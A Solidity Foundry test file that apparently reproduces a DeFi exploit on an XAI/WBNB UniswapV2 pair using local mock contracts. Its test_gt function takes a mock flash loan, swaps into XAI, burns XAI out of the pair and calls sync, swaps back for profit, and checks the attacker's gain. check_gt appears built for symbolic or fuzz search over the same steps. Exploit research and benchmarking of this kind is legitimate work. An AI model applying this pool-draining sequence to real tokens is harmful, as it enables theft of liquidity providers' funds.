// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";
import {XAI} from "./XAI.sol";

contract XAITestBase is Test, BlockLoader {
    WBNB wbnb;
    XAI xai;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address xaiAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1700018887;
    uint112 reserve0pair = 100000000000000000000000000000;
    uint112 reserve1pair = 1090000000000000000;
    uint32 blockTimestampLastpair = 1700018878;
    uint256 kLastpair = 109000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint256 totalSupplyxai = 100000000000000000000000000000;
    uint256 balanceOfxaipair = 100000000000000000000000000000;
    uint256 balanceOfxaiattacker = 0;
    uint256 totalSupplywbnb = 2409166684392094180632129;
    uint256 balanceOfwbnbpair = 1090000000000000000;
    uint256 balanceOfwbnbattacker = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        xai = new XAI(
            "XAI",
            "XAI",
            18,
            1e11,
            1,
            0,
            1,
            address(0x0),
            address(this)
        );
        xaiAddr = address(xai);
        pair = new UniswapV2Pair(
            address(xai),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        xai.transfer(address(pair), balanceOfxaipair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(xai), address(wbnb), xai.decimals());
        emit log_string("");
        emit log_string("Xai Balances: ");
        queryERC20BalanceDecimals(address(wbnb), address(xai), wbnb.decimals());
        queryERC20BalanceDecimals(address(xai), address(xai), xai.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(xai), address(pair), xai.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(xai),
            address(attacker),
            xai.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_xai_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        xai.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_xai_owner(uint256 amount) internal eurus {
        xai.transfer(owner, amount);
    }

    function swap_pair_attacker_xai_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        xai.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_xai(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_xai_pair(uint256 amount) internal eurus {
        xai.burn(amount);
        pair.sync();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_wbnb_owner(3000 * 1e18);
        printBalance("After step0 ");
        swap_pair_attacker_wbnb_xai(
            wbnb.balanceOf(attacker),
            pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
        );
        printBalance("After step1 ");
        burn_xai_pair(xai.totalSupply() - 10000);
        printBalance("After step2 ");
        swap_pair_attacker_xai_wbnb(
            xai.balanceOf(attacker),
            pair.getAmountOut(xai.balanceOf(attacker), address(xai))
        );
        printBalance("After step3 ");
        payback_wbnb_owner(3000 * 1e18);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_xai(amt1, amt2);
        burn_xai_pair(amt3);
        swap_pair_attacker_xai_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
